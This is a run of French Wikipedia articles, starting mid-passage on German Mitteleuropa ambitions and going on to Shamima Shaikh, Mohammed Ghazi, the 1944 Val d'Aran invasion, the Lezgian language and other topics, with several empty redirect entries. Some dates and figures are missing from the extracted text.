En 1915, le projet allemand est formalisé de manière définitive par le théoricien politique Friedrich Naumann. Il défend, dans un contexte de débat sur les buts de guerre, la thèse d'une Europe centrale regroupée au sein d'une fédération d'États organisée autour du "Reich". Du point de vue austro-hongrois, ces projets d'union politique et économique en Europe centrale suscitent des nombreuses réserves. Ainsi, les catholiques autrichiens sont méfiants à l'égard d'une construction politique dans laquelle ils seraient minoritaires, et les responsables hongrois se montrent hostiles à des projets politiques qui aboutiraient à la diminution de l'influence de leur pays.
En 1918, l'Allemagne tire profit de la Révolution de février en Russie et de la défaite roumaine et négocie les conditions de son intervention en Finlande. d'une « société pétrolière de la », constituée à partir de l'ensemble des sociétés pétrolières dont les capitaux sont détenus par les Alliés ou par les puissances centrales, mais contrôlée exclusivement par le "Reich" et disposant du monopole sur l'industrie pétrolière en Roumanie et, dans le second cas, par des accords commerciaux avantageant l'Allemagne dans les faits.
À plusieurs reprises, l'Allemagne est en position de réaliser ses ambitions hégémoniques en Europe, dans les années précédant la Grande Guerre, puis au cours de celle-ci, après la Révolution russe, lorsque l'épuisement ou le dénuement de ses alliés : l'Autriche-Hongrie, la Bulgarie et l'Empire ottoman, aboutissent à la constitution d'une zone sous contrôle exclusif de l'Empire allemand. Les dirigeants du Reich souhaitent transformer la Triplice, conçue au départ comme une alliance militaire, en alliance économique. Au terme des négociations de l'hiver et du printemps 1918, la Roumanie vaincue doit accepter les conditions draconiennes du traité de Bucarest, et la double monarchie tombe de plus en plus dans une position subordonnée : les responsables allemands sont proches de leur objectif, la formation d'une sous tutelle allemande. Face à la Roumanie, Berlin propose l'intégration du royaume à la fédération douanière austro-allemande. Lors de la conférence de Spa, en , les négociateurs allemands imposent leurs conditions à la double monarchie, totalement épuisée par de conflit et promise à un triple assujettissement : politique, militaire et économique.
Des années 1920 à la période nazie.
Les traités de paix, sanctionnant la défaite du "Reich", rendent momentanément caduques les projets de contrôle des Balkans et de l'Europe de l'Est par le "Reich".
Durant les années 1920, le "Reich" mène une politique de lutte contre les intérêts des puissances rivales dans l'ensemble des territoires constituant la Mitteleuropa, de l'Estonie à la Bulgarie. Camouflée derrière une politique d'assistance aux populations allemandes des divers États successeurs de la monarchie danubienne, les objectifs de la politique du "Reich" visent à disposer, dans un premier temps d'un solide moyen de pression à l'encontre de ces États afin de les inféoder durablement au "Reich".
Durant ces années, c'est au travers du double argumentaire de et du rapprochement entre les Allemands du "Reich" et ceux ressortissants des États successeurs que les ambitions du "Reich" sur l'Europe centrale se formulent.
Cette politique est poursuivie avec plus d'insistance à partir de 1933, surtout à partir de Vienne et Munich.
En effet, dès 1933, les ambitions du "Reich" s'affirment, notamment en Autriche. Une fois l'Autriche absorbée, la Tchécoslovaquie constitue le second jalon de la reconstitution au profit du "Reich" d'un vaste ensemble économique en Europe centrale.
En effet, la mise sous contrôle de la Tchécoslovaquie constitue le premier jalon de reconstitution au profit du "Reich" d'un vaste ensemble au centre de l'Europe. Dépecée lors des accords de Munich, la Tchécoslovaquie se trouve face à la sécession slovaque, qui est suscitée par le Reich, et Prague doit accepter les clauses de mise sous tutelle dictée par Berlin.
Pendant ce temps, le "Reich" renforce son contrôle sur le Danube, mais doit affronter l'hostilité soviétique renforcée à la commission du Danube, qui est chargée de régler les différends entre les pays riverains du fleuve. En effet, les stratèges soviétiques estiment essentiel pour la défense de l'influence de leur pays sur le pourtour de la Mer Noire d'être en mesure de contrôler les accès, qu'il s'agisse des Détroits ou du delta du Danube, qu'ils contrôle en partie lors de la prise de contrôle de la Bessarabie. Au cours de l'automne 1940, la limitation précise des eaux territoriales soviétiques et roumaines dans le delta du Danube n'étant pas encore précisément fixée, l'Armée rouge prend le contrôle effectif du bras de Staro Stamboul et bras de Kilia à la grande stupeur des Allemands, et face à l'hostilité roumaine. Cependant, ces ambitions se heurtent à la puissance allemande sur le fleuve, renforcée par la prise de contrôle de l'Autriche, par la satellisation de la Slovaquie, par l'apathie yougoslave. La Roumanie fait appel aux troupes allemandes pour sa protection, dans un contexte de rapprochement entre la Bulgarie et l'Union soviétique, matérialisé par une demande soviétique de contrôle militaire de la Bulgarie.
Au cours de la fin des années 1930 et jusqu'à l'invasion allemande de l'Union soviétique, les petits États riverains du Danube, Roumanie et Bulgarie sont l'objet des rivalités entre les grandes puissances européennes, principalement le "Reich" et l'Union soviétique. La tutelle allemande s'affirme sur la Roumanie, comme lors de la Grande Guerre, et l'influence soviétique se fait sentir sur la Bulgarie, où l'Union soviétique jouit d'un grand prestige.
Dans les années 1930, la Roumanie, objet des ambitions austro-allemandes en 1917-1918, est de plus en plus étroitement contrôlée économiquement, puis politiquement, par le "Reich". Ainsi, en 1940, face à la menace représentée par le contrôle soviétique de la Bessarabie, le "Reich" renforce son contrôle politique et économique sur la Roumanie, qui s'est vue amputée de cette région, et l'Union soviétique jouit d'une grande popularité en Bulgarie.
Aux Bulgares, Molotov propose la totalité de la Dobroudja, créant ainsi une continuité entre l'Union soviétique et le Royaume de Bulgarie. Cependant, face à ces propositions et pour garantir l'influence allemande dans le pays, le "Reich" infiltre quelques centaines de soldats sur le territoire bulgare.
À côté de cette politique, les appétits s'aiguisent autour de Salonique, menace directe sur les Détroits et enjeu essentiel de la diplomatie soviétique à partir du mois de .
Mémoire et historiographie.
À la suite de la Seconde Guerre mondiale, la constitue un aspect des enjeux de mémoire autour du national-socialisme et de sa place dans l'histoire allemande.
Aspect du.
En effet, pour certains, les ambitions allemandes sur l'Europe centrale constituent un aspect du du peuple allemand.
Place de l'Autriche.
D'autres font de la Mitteleuropa un ensemble tourné autour de Vienne, mais la réduction de l'Empire autrichien à la seule république d'Autriche remet en cause le rôle des Autrichiens dans la constitution de cet ensemble géopolitique.
Littérature.
Le mythe littéraire du Mitteleuropa se fonde "a posteriori" sur la nostalgie d'un paradis perdu, la "Sehnsucht" allemande, topos exploité notamment par des exilés, ayant quitté la région pour des raisons politiques et artistiques.
Les grands écrivains de la Mitteleuropa, selon Claudio Magris, sont Thomas Mann ("La Montagne Magique"), Arthur Schnitzler ("Vienne au Crépuscule"), Stefan Zweig ("La Confusion des sentiments"), Joseph Roth, Léo Perutz, Franz Kafka, Robert Musil ("L’homme sans qualité") et les récents prix Nobel Olga Tokarczuk et Peter Handke.
La Hongrie est bien représentée par Marai Sandor dont la diffusion en France de son journal est récente. Son roman "les étrangers" relate la migration après 1920.

</doc>
<doc id="2846471" url="https://fr.wikipedia.org/wiki?curid=2846471" title="Bryoflore">
Bryoflore



</doc>
<doc id="2846472" url="https://fr.wikipedia.org/wiki?curid=2846472" title="Shamima Shaikh">
Shamima Shaikh

Shamima Shaikh ( - ) était la plus connue des féministes musulmanes d'Afrique du Sud.
Sous l'apartheid.
Née à Louis-Trichardt, dans l'actuelle province de Limpopo (ancien Nord-Transvaal), elle termina l'école en 1978 et étudia jusqu'en 1984 à l'université de Durban-Westville (UD-W), réservée sous lapartheid" aux étudiants d'origine indienne. Durant cette période, elle s'engagea dans les luttes politiques contre lapartheid", et fit partie de l'AZAPO ("Azanian People's Organisation") de 1984 à 1986.
Shamina Shaikh fut élue en 1985 au comité exécutif de la Société islamique de l'UD-W. Elle est arrêtée le pour avoir participé à une opération de tractage organisé par le MSA ("Muslim Students Association of South Africa", ou « Association d'étudiants musulmans d'Afrique du Sud ») qui appelait au "boycott", organisé par le syndicat Fosatu ("Federation of South African Trade Unions"), des commerces appartenant à des Blancs à Durban. C'est lors de cette arrestation qu'elle rencontre Na'eem Jeenah, le président du MSA, avec qui elle se marie deux ans plus tard.
Une fois ses études terminées, Shamima Shaikh enseigne à Pietersburg, avant de déménager pour Johannesbourg à la suite de son mariage le . Après avoir donné naissance à deux enfants, elle commence à travailler en 1989 avec "al-Qalam", un journal s'adressant à la communauté musulmane, qui représente 2 % de la population d'Afrique du Sud. Elle s'engage aussi de plus en plus aux côtés du MYM ("Muslim Youth Movement of South Africa", ou « Mouvement de jeunesse musulmane d'Afrique du Sud).
Avec les jeunes militants du MYM, elle fait campagne en 1989 et 1990 contre les élections du Parlement tricaméral, participant aussi aux campagnes du "Mass Democratic Movement" (« Mouvement démocratique de masse »). En 1993, elle est élue secrétaire de la section locale du Transvaal du MYM, devenant du même coup la deuxième femme à accéder au comité exécutif national du mouvement.
C'est cette même année que Shamima Shaikh devient célèbre pour avoir initié la campagne « les femmes dans la mosquée ». Lors du Ramadan, Shaikh et d'autres femmes militant au MYM se mettent alors à mobiliser les femmes afin qu'elles participent aux prières "tarawih" à la mosquée de la , dans Fietas, à Johannesbourg. Cette action mena à des conflits entre les membres du comité de la mosquée et les militantes du MYM.
Shamima Shaikh devint ensuite la première coordinatrice nationale pour le "Muslim Youth Movement Gender Desk" ( « Bureau pour le genre du mouvement de jeunesse musulmane »), position qu'elle conserva jusqu'à sa démission à la mi-1996. Sous la direction de Shaikh, le Bureau pour le genre devint l'organisation musulmane la plus active concernant les questions des droits de la femme musulmane et du genre à l'intérieur de la communauté musulmane, et donc l'association la plus active concernant la thématisation sud-africaine du féminisme musulman.
Après l"'apartheid".
Lors de la campagne pour les élections de 1994, premières élections nationales non raciales à être organisées en Afrique du Sud, Shaikh participa activement au Forum musulman sur les élections, une coalition d'organisations qui appelaient au vote pour les partis ayant participé au mouvement de libération, en particulier l'ANC (Congrès national africain) et le PAC (Congrès panafricain d'Azanie).
Shamima Shaikh fut diagnostiquée comme atteinte d'un cancer du sein en 1994, et suivie une chimiothérapie en 1996. Après la disparition du cancer, elle décida de ne plus se soumettre à un nouveau traitement chimiothérapique en cas de résurgence de la maladie, refusant de survivre, malade, à l'hôpital. En 1996, elle fit une rechute. La même année, elle fut nommée directrice de gestion de la revue "Al-Qalam", qui devint sous sa tutelle le porte-voix d'un islam progressiste en Afrique du Sud.
Shamima Shaikh effectua le "hajj" (pèlerinage à La Mecque) en avril 1997 avec son mari, expérience qui les mena à écrire à leur retour "Journey of Discovery: A South African Hajj" (publié en 2000). En , la radio de la communauté musulmane, "The Voice", commençait à émettre, avec Shaikh à sa tête.
Le , Shaikh prononça une conférence intitulée "Women &amp; Islam – The Gender Struggle in South Africa: The Ideological Struggle" (« Les Femmes et l'islam - la lutte pour le genre en Afrique du Sud : la lutte idéologique »), avant de mourir dix-sept jours plus tard.
L'une des quatre prières funéraires, mixte, faites lors de son enterrement fut effectuée, en conformité avec les requêtes de Shaikh, par une amie (d'ordinaire, ce sont des imams masculins qui dirigent les prières mixtes). Beaucoup de femmes participèrent à ses funérailles à la mosquée de Johannesbourg et à la mosquée de Claremont, au Cap, première mosquée à avoir institué des prières mixtes dirigées par des femmes après celle effectuée en 1994 par l'Afro-Américaine Amina Wadud. Elle est enterrée à Pietersburg.

</doc>
<doc id="2846473" url="https://fr.wikipedia.org/wiki?curid=2846473" title="Féministes musulmanes">
Féministes musulmanes



</doc>
<doc id="2846475" url="https://fr.wikipedia.org/wiki?curid=2846475" title="Whip Rush">
Whip Rush

 est un jeu vidéo de type "shoot them up" sorti en 1990 et fonctionne sur Mega Drive. Le jeu a été développé par Vic Tokai puis édité par Sega au Japon et par Renovation Products aux États-Unis.

</doc>
<doc id="2846480" url="https://fr.wikipedia.org/wiki?curid=2846480" title="S.S. Lucifer Man Overboard!">
S.S. Lucifer Man Overboard!



</doc>
<doc id="2846484" url="https://fr.wikipedia.org/wiki?curid=2846484" title="The Amazing Spider-Man vs. The Kingpin">
The Amazing Spider-Man vs. The Kingpin

 (aussi connu sous le nom ) est un jeu vidéo d'action et de plates-formes sorti en 1991 en arcade sur et sur console , , et . Le jeu a été développé par et et édité par .

</doc>
<doc id="2846486" url="https://fr.wikipedia.org/wiki?curid=2846486" title="Beaubassin Est">
Beaubassin Est



</doc>
<doc id="2846489" url="https://fr.wikipedia.org/wiki?curid=2846489" title="Sous-sol">
Sous-sol

Sous-sol peut faire référence : 

</doc>
<doc id="2846491" url="https://fr.wikipedia.org/wiki?curid=2846491" title="Mohammed Ghazi">
Mohammed Ghazi

Mohammed Ghazi, ou Mollah Khazi (en russe : Кази-Мулла) né en 1795, mort en 1832, est un Avar caucasien, ouléma et ascète, premier imam du Daghestan (1829-1832), avant son ami Chamil. Il a promu la purification spirituelle de chaque musulman, une stricte charia, et prôné la guerre sainte contre l'Empire russe envahissant le Caucase. C'était un des premiers adeptes et diffuseur du mouridisme caucasien, mouvement de l'islam proche du soufisme et utilisés par les imams pour exalter le sentiment national-religieux anti-russe dans le Caucase.
Biographie.
Jeunesse.
Élevé au Daghestan en compagnie de son ami de jeunesse Chamil, ils étudient tous deux le Coran à Yaraghal, un centre d'enseignement soufi. Tous deux désapprouvent la faible religiosité des tribus montagnardes du Caucase, qui pratiquent un mélange des lois islamiques et d"'adat" (traditions locales). Leur mentor est le mollah Mohammed Yaraghi, érudit soufi qui les prendra comme "alem" (disciples).
Ghazi pense que la guerre sainte contre les Russes qui veulent contrôler la région ne peut commencer que si les tribus caucasiennes se mettent à suivre la loi islamique à la lettre. En 1829, il commence à prêcher une stricte obéissance à la charia, le zakât (charité fraternelle), la prière cinq fois par jour et le hajj (pèlerinage à La Mecque), ajoutant que tout cela n'aura de valeur selon le jugement d'Allah que si les Russes sont chassés de la région. Reliant toujours davantage religion et politique, il dira même que les mariages seront invalides et les enfants seront des bâtards tant qu'un seul Russe restera dans le Caucase.
Il devient un des prêcheurs les plus écoutés, connu dans tout le Caucase. Tous ne partagent pas ses positions, mais sa mémorisation de plus de 400 hadiths lui permet de sortit vainqueur de tous les débats avec n'importe quel autre prêcheur. Comme sa réputation augmente, il est invité par de nombreux khanats ou royaumes, aussi bien favorables qu'hostiles au tsar. En signe d'humilité et d'ascétisme, il refuse d'aller à cheval, mais seulement à pied.
Guerre sainte.
Cette même année, il devient imam de Guimry, où il a auparavant lancé son appel au djihad anti-russe. Il demande que tout alcool soit publiquement déversé au sol. En 1830, avec Chamil, ils échouent à prendre Khounzakh, la capitale du khanat musulman modéré des Avars daghestanais. Après cet échec, Chamil le convainc d'attendre que toutes les tribus soient unies sous la loi coranique. En 1831, après quelques mois de répit, il attaque le nord du Daghestan et remporte des succès. Sa tactique de guérilla prend au dépourvu les Russes mal préparés et en 1832, il parvient à menacer la grande ville fortifiée de Vladikavkaz (actuelle Ossétie du nord), même si les Russes repoussent ses attaques. Lorsqu'ils contre-attaquent et prennent l'aoul de Guimry, ils auraient, d'après la légende locale, trouvé Ghazi . Les Russes portent sa dépouille à Tarkou et la confient au Khan qui leur est loyal. Il est exposé en place publique pendant quelques jours, avant d'être enterré dans les collines environnantes.
Son successeur comme imam du Daghestan fut Gamzat-bek.
Liens externes.
Revue des deux mondes, 1838

</doc>
<doc id="2846493" url="https://fr.wikipedia.org/wiki?curid=2846493" title="Laurent Albarracin">
Laurent Albarracin

Laurent Albarracin est un poète et éditeur français, né le à Angers. Il dirige les éditions "Le Cadran ligné" qui publient essentiellement de la poésie. 
Il a participé au Jardin ouvrier autour d'Ivar Ch'Vavar à la fin des années 1990. Proche de Pierre Peuchmaurd, il lui a consacré un volume de la collection « Présence de la poésie » (Éditions des Vanneaux, 2011). 
Il a co-animé la revue "Catastrophes", avec Guillaume Condello et Pierre Vinclair, de 2017 à 2025. 
Après avoir tenu une chronique de poésie sur le site de Pierre Campion, il donne aujourd'hui des notes de lecture sur "Poesibao" ou "En attendant Nadeau" qu'il rassemble ensuite dans des volumes de "Lectures" (éditions Lurlure). 

</doc>
<doc id="2846494" url="https://fr.wikipedia.org/wiki?curid=2846494" title="Invasion du Val d'Aran">
Invasion du Val d'Aran

L'invasion du Val d'Aran, connue sous le nom de code "" (« Opération Reconquête de l'Espagne »), est une opération militaire lancée en octobre 1944 par la Unión Nacional Española (UNE), une structure qui rassemble des communistes, mais aussi des socialistes, républicains ou anarchistes – que la dispersion de leurs organisations poussent à rejoindre ce mouvement de lutte organisée contre le nazisme.
Cette opération visait à établir un gouvernement provisoire républicain dans le Val d'Aran, une vallée pyrénéenne de Catalogne située à la frontière entre la France et l'Espagne, par l'intermédiaire d'une attaque de guérilleros antifranquistes ayant participé à la Seconde Guerre mondiale au sein de la Résistance française et vétérans de la guerre d'Espagne sur ce territoire. Elle fut un échec total.
Contexte : fin de la Seconde Guerre mondiale en France.
Le débarquement allié en Normandie le puis l'avancée rapide de la division du général Leclerc sur Paris et le fait qu'une grande partie du Midi de la France avait été libéré de l'occupation nazie par la Résistance laissa penser à certains groupes de Républicains espagnols réfugiés en France à la suite de la Guerre d'Espagne que la fin du régime franquiste était imminente. Ils répondirent en conséquence positivement à l'appel à l'invasion du général de division José Riquelme relayé par Radio Toulouse.
"Operación Reconquista de España".
Jesús Monzón, personnalité du Parti communiste espagnol en France, dirigeait la résistance républicaine en France occupée et essayait de rétablir une infrastructure du parti en Espagne. Mis en confiance par le succès des actions de guérilla menées par la Résistance contre les Nazis, il pensait qu'il serait possible d'amorcer une reconquête républicaine de l'Espagne en passant par les Pyrénées, ce qui susciterait un soulèvement de la population civile contre le régime. Cette position allait à l'encontre de ce que disaient les informateurs du parti en Espagne et de ce que pensaient beaucoup de dirigeants et de militaires communistes qui penchaient pour la formation de noyaux de résistance endogènes grâce à l'envoi de résistants aguerris chargés de monter des maquis à la manière de ce qu'avaient fait les partisans Yougoslaves.
Afin de préparer l'invasion, les guérilleros, de la guerre d'Espagne et de la Résistance française rallièrent les points de recrutement à Foix et à Toulouse. Parmi eux, entre se portèrent volontaires pour participer à l'opération.
La stratégie consistait à lancer une série d'attaques sur toute la frontière, tâche dévolue à la division 102 et à mener une percée dans le val d'Aran, véritable objectif de l'opération dont la particularité est d'être situé sur le versant nord des Pyrénées, côté français et qui n'était à l'époque relié au reste de l'Espagne que par le port de la Bonaigua (). L'imposant massif de la Maladeta constituait un barrage naturel vers le sud. Cette invasion menée par la division 204 devait mener à la formation d'un gouvernement provisoire protégé par l'isolement de la vallée, ce qui serait censé mener à une démoralisation du régime, à un soulèvement populaire et une invasion alliée provoquant la fin du franquisme.
En prévision d'une invasion alliée depuis la France, le gouvernement franquiste avait chargé le chef de l'état-major de l'armée Rafael García Valiño d'assurer la défense de la frontière franco-espagnole. Il disposait pour cette tâche de commandés par les généraux José Moscardó et Juan Yagüe et d'une petite ligne de fortifications, la Ligne P.
Le la division 102 lança l'offensive, la de la UNE composée de pénétra à Roncevaux en Navarre et se retrouva face à un corps de police armée au col de Laza, entre le massif de l'Abodi et celle d'Uztárroz. Deux policiers ainsi qu'un garde civil trouvèrent la mort. Le 5, la forte de pénétra dans la vallée de Roncal. Ce fut le début d'une série d'incursions dans les Pyrénées espagnoles au niveau de la Navarre, et des provinces de Huesca et de Lérida menées par plusieurs brigades qui revenaient quelques jours plus tard en France. Le 8 octobre, le bataillon Legazpi XXIII de l'armée franquiste rejoignit les Pyrénées navarraises depuis Saint-Sébastien afin de contrer les actions de la guérilla.
La division 204 des guérilleros, nouvellement créée, menée par le colonel Vicente López Tovar et structurée en douze brigades divisées en bataillons et en compagnies d'une trentaine d'hommes fut chargée de mener l'opération principale en Val d'Aran. Les objectifs militaires étaient triples, établissement d'une ligne de communication sûre avec la France passant par le Pont du Roy à Fos afin de pouvoir faire venir des renforts ou le cas échéant de battre en retraite, prise de Vielha, chef-lieu du Val d'Aran afin d'y établir une capitale provisoire et prise du port de la Bonaigua afin d'empêcher la venue de renforts franquistes.
L’invasion.
Le à six heures du matin, les hommes de la division 204 armés de fusils français, allemands et tchèques ainsi que de pistolets mitrailleurs Sten, de mitrailleuses BREN, de quelques mortiers de calibre 81 et d'une pièce d'artillerie antiaérienne commencèrent à se mettre en marche, divisés en trois colonnes devant converger au sud de Vielha.
Dans la partie inférieure du Val d'Aran, la progression de la division fut très rapide, la brigade entra par le port de Vénasque, opérant un mouvement tournant vers l'Hospital de Viella afin de couper la route aux renforts de l'armée espagnole. La passa le port de la Hourquette et se divisa en trois colonnes, l'une se dirigea sur Bausen et Canejan provoquant la fuite de la garde civile, la seconde se dirigea vers Les, occupant au passage Porcingles et faisant 10 gardes civils prisonniers, et la troisième entra par les passages de Estiuera et Cuma et se dirigea vers Bossòst où la garde civile retranchée dans sa caserne offrit une résistance. La passa par le port de Tavascan en direction de Es Bòrdes où elle dut affronter la seconde compagnie du bataillon Albuera.
Dans le Naut Aran (« Haut-Aran »), la résistance fut plus intense. La passa le port d'Orle en direction de Salardú, et occupa Bagergue tandis que l'un des bataillons s'installa sur des collines depuis lesquelles il pouvait contrôler la route Tremp-Vielha. Le reste de la brigade essaya de prendre le village de Salardú, sans succès.
Les débuts de l'opération furent donc couronnés de succès ; la guérilla occupa les localités de Bausen, Canejan, Porcingles, Pradell, Les, Bossòst, Era Bordeta, Vilamós, Benòs, Bòrdes, Aubèrt, Betlan, Vilach, Mont, Montcorbau et Vila établissant son état-major à Bossòst le 20 octobre où elle resta jusqu'à la retraite, stoppant l'offensive le 23 aux environs de Vielha où José Moscardó à la tête de l'armée et la garde civile étaient retranchés. Les principaux combats eurent lieu à Bossòst et à Salardú le 19 ainsi qu'à Era Bordeta et Bòrdes, le 20.
Les premiers renforts de l'armée espagnole, le de chasseurs de montagne et la légion espagnole, arrivèrent le 19 au port de la Bonaigua qui n'avait pu être pris par la guérilla et sans lequel la défense des positions prises était impossible, face à la supériorité des troupes franquistes. Le soulèvement populaire tant espéré ne se produisit pas non plus et très peu d’Aranais se joignirent aux guérilleros antifranquistes.
Les troupes espagnoles stationnées le long de la frontière furent prises par surprise, puis réagirent par un important déploiement militaire, menaçant de cerner les guérilleros : l'arrière-garde de la franquiste était en position de les attaquer tandis que des troupes les attendaient de l'autre côté du tunnel de Vielha.
Le , Santiago Carrillo et l'état-major de la guérilla en France décidèrent de quitter Vielha et d'amorcer une retraite.
Conséquences.
Selon les chiffres officiels, l'Opération Reconquête de l'Espagne fit 588 morts parmi les membres de la guérilla. Son échec eut d'importantes répercussions au sein du parti communiste espagnol ; Jesús Monzón vit sa carrière politique brisée. Capturé à Barcelone, il resta emprisonné jusqu'à ce qu'il soit gracié en 1959, et s'exila alors au Mexique. Santiago Carrillo, en revanche, vit sa carrière prendre un envol. Charles de Gaulle fit désarmer les guérilleros après avoir reconnu le gouvernement franquiste le 16 octobre 1944 .
Le parti communiste continua ses opérations de guérilla en Espagne, créant plusieurs maquis en plusieurs points du territoire espagnol mais il abandonna cette stratégie en 1948.

</doc>
<doc id="2846495" url="https://fr.wikipedia.org/wiki?curid=2846495" title="Klimovsk">
Klimovsk

Klimovsk (en ) est une ville de l'oblast de Moscou, en Russie, dans le raïon de Podolsk. Sa population s'élevait à habitants en 2015.
Géographie.
Klimovsk est située à au sud de Moscou et à au sud de Podolsk.
Histoire.
Le village de Klimovka () est fondée dans la première moitié du près de la route Moscou – Toula – Serpoukhov. Klimovka est renommé Klimovsk en 1883, reçoit le statut de commune urbaine en 1928 et celui de ville le . La naissance et le développement de Klimovsk sont étroitement liés à l'histoire de l'usine de constructions mécaniques. Le chemin de fer Moscou – Koursk passant à proximité du village a permis à un groupe de fabricants de commencer, en 1882, la construction d'une usine de pièces détachées pour les métiers à tisser le coton des provinces centrales de la Russie.
Population.
Recensements (*) ou estimations de la population

</doc>
<doc id="2846497" url="https://fr.wikipedia.org/wiki?curid=2846497" title="1952 au Québec">
1952 au Québec



</doc>
<doc id="2846501" url="https://fr.wikipedia.org/wiki?curid=2846501" title="Metzgeria furcata">
Metzgeria furcata

Metzgeria furcata est une espèce d'hépatiques appartenant à la classe des Jungermanniopsida ou à celle des Hepatopsida selon les classifications et à l'ordre des "Metzgeriales".
Description.
On la trouve parfois comme épiphyte corticole, parfois associée à "Metzgeria conjugata", c'est-à-dire sur les écorces d'arbres, notamment de frênes dans certaines vallées forestières humides.
Habitat.
Tronc humide, tronc mort humide, creux humides et zones boisées humides.
Rareté ou menace.
C’est une plante discrète, dont la répartition précise est mal connue.

</doc>
<doc id="2846505" url="https://fr.wikipedia.org/wiki?curid=2846505" title="Spider-Man (jeu vidéo)">
Spider-Man (jeu vidéo)



</doc>
<doc id="2846507" url="https://fr.wikipedia.org/wiki?curid=2846507" title="Ford C-MAX">
Ford C-MAX



</doc>
<doc id="2846508" url="https://fr.wikipedia.org/wiki?curid=2846508" title="Spider-Man vs. The Kingpin">
Spider-Man vs. The Kingpin



</doc>
<doc id="2846511" url="https://fr.wikipedia.org/wiki?curid=2846511" title="Yves Lequette">
Yves Lequette

Yves Lequette est un universitaire français né en 1946 à Neuilly-sur-Seine. 
Biographie.
Agrégé des facultés de droit (major du concours 1973), il est professeur à l'université Panthéon-Assas (Paris II). L'essentiel de ses publications et de ses enseignements se rapportent au droit international privé et au droit civil, tout particulièrement au droit des obligations et au droit patrimonial de la famille. 
Il obtient le titre de docteur en 1973 (publiée en 1976), avec une thèse intitulée "Protection familiale et protection étatique des incapables" sous la direction d'Henri Batiffol". "Il est l'auteur de nombreux articles parus chez" Dalloz, "en particulier à la "Revue critique de droit international privé". Réputé pour son approche critique mais non moins pénétrante du droit contemporain, il officie régulièrement dans le cadre de l'Académie de droit international de La Haye. Il est également le coauteur de plusieurs ouvrages fondamentaux, parmi lesquels les "Grands arrêts de la jurisprudence civile" ainsi que les "Grands arrêts de la jurisprudence du droit international privé."
Il est directeur de l'École doctorale de droit privé de l'université Panthéon-Assas jusqu'en 2004. En 2005, il préside le jury du premier concours national d'agrégation de l'enseignement supérieur en droit privé. Jusqu'à sa retraite en 2015, il a continué d'enseigner à Paris 2, en particulier le droit des obligations et le droit international privé en Master 2. 
Il a dirigé de 2009 à la direction du Master 2 Droit privé général à l'Université Paris 2.

</doc>
<doc id="2846513" url="https://fr.wikipedia.org/wiki?curid=2846513" title="Cruising">
Cruising

Le terme « Cruising » peut désigner

</doc>
<doc id="2846515" url="https://fr.wikipedia.org/wiki?curid=2846515" title="Lezghien">
Lezghien

Le lezghien (également : lezghine, lezgi ; en lezghien : ) est une langue parlée par les Lezghiens, qui vivent dans le sud du Daghestan (une république de la fédération de Russie) et dans le nord de l'Azerbaïdjan.
Classification.
Le lezghien appartient au groupe lezgique de la famille des langues nakho-daghestaniennes.
Distribution géographique.
En 1996, le lezguien était parlé par en Russie, principalement dans le sud du Daghestan, ainsi que par en Azerbaïdjan. Le lezguien est également parlé en Géorgie, au Kazakhstan, au Kirghizistan, en Turquie, au Turkménistan, en Ukraine et en Ouzbékistan. Le nombre total de locuteurs est évalué à .
Statut.
Le lezguien est une des langues officielles du Daguestan. 
Langues apparentées.
On dénombre dix langues à l'intérieur de la famille lezguienne, à savoir, outre le lezguien : le tabassaran, le routoul, l'agul, le tsakhur, le budukh, le kryz, le khinalug, l'oudi et l'artchi. Ces langues portent les noms des sous-groupes ethniques qui les parlent.
Dialectologie.
Le lezguien se parle sous trois formes dialectales qui ne sont pas toujours intercompréhensibles.
Écriture.
Le lezguien a été écrit avec l’alphabet albanien et ensuite l’alphabet arabe. À la fin du et au début du , Peter von Uslar utilise un alphabet latin avec des lettres additionnelles. En 1928 un alphabet latin est adopté et est remplacé par une alphabet cyrillique en 1938. En 2018, un nouvel alphabet latin est proposé et utilisé dans la première année d’école primaire en Azerbaïdjan, mais est fortement critiqué notamment dans le journal .
Grammaire.
Le lezguien présente la particularité pour une langue du Caucase du nord de ne pas posséder de classes nominales. Le lezguien standard présente 18 cas, dont 12 sont toujours utilisés dans le langage parlé courant.

</doc>
<doc id="2846518" url="https://fr.wikipedia.org/wiki?curid=2846518" title="Mollah Ghazi">
Mollah Ghazi



</doc>
<doc id="2846521" url="https://fr.wikipedia.org/wiki?curid=2846521" title="Mélaminé">
Mélaminé

Un mélaminé ou plus précisément un panneau surfacé mélaminé (PSM) est un panneau dérivé du bois fabriqué par application directe de papiers imprégnés de résine aminoplaste sur au moins une des faces du panneau support. L'adhérence et la réticulation ont lieu à chaud et sous pression sans l'utilisation de colle. 
Le mélaminé ne doit pas être confondu avec le stratifié qui, lui, est obtenu en collant une feuille de maximum 0,2 mm d'épaisseur à la colle contact sur un panneau dérivé du bois. Le mélaminé est généralement plus fragile que le stratifié.
Panneaux supports.
Le mélaminé utilise généralement comme support un panneau MDF ("Medium Density Fibreboard") ou un panneau de particules communément appelé « aggloméré » ou « agglo », mais des solutions sur panneau sandwich existent pour l'agencement intérieur. La même technique est déclinée sur des plaques de plâtre pour la réalisation de cloisons amovibles.
Propriétés.
Il se travaille et se plaque sur chant avec des chants thermocollants mélaminés, PVC, polypropylène ou placage bois. Il a une bonne résistance à la flexion, à condition toutefois que l'on respecte certaines règles de mise en œuvre. La détermination des propriétés des mélaminés peut être réalisée en suivant la norme EN 14323.
Les mélaminés sont proposés en différents aspects et finitions : mat, brillant, satiné, givré, « "soft" », structuré bois.
Utilisations.
Ce matériau est utilisé pour la réalisation des caissons de cuisine, pour l'intérieur de placards (tablettes de rangement dans une garde-robe), les tablettes de fenêtres ou encore les meubles en kit.

</doc>
<doc id="2846522" url="https://fr.wikipedia.org/wiki?curid=2846522" title="Carractères hyperthéliqes">
Carractères hyperthéliqes



</doc>
<doc id="2846523" url="https://fr.wikipedia.org/wiki?curid=2846523" title="Han Seung-soo">
Han Seung-soo

 
Han Seung-soo, né le à Chuncheon, province du Gangwon, est un diplomate et homme d'État sud-coréen. Il est Premier ministre de la Corée du Sud du au . Il a également été président de l'Assemblée générale des Nations unies. Il représente le Grand parti national (conservateur).
Éducation.
Han obtient une licence à l'université Yonsei en 1960, puis un master à l'université nationale de Séoul en 1963, et un doctorat d'économie à l'université d'York (Royaume-Uni) en 1968. Il enseigne dans plusieurs universités en Angleterre et en Corée du Sud.
Carrière politique et diplomatique.
Il est élu député à l'Assemblée nationale en 1988. De 1993 à 1994, il est ambassadeur de son pays aux États-Unis, puis conseiller principal du président Kim Young-sam de 1994 à 1995. De 1996 à 1997, il est vice-Premier ministre et ministre des Finances.
